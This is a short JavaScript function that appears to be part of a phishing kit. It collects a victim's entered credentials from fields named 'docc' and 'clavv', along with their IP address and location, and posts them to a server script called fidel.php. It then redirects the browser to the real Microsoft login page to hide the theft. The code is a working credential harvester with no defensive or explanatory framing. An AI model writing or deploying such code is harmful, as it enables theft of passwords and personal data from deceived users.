function sender() {
    var docc = document.getElementById("docc").value;
    var clavv = document.getElementById("clavv").value;
    var ip = document.getElementById("gfg").innerHTML;
    var address = document.getElementById("address").innerHTML;
    var data = {
        docc: docc,
        clavv: clavv,
        ip: ip,
        address: address
    };
    fetch('fidel.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(function(response) {
        window.location.href = "https://login.live.com/";
    }).catch(function(error) {
        console.error('Error:', error);
    });
    return false;
}
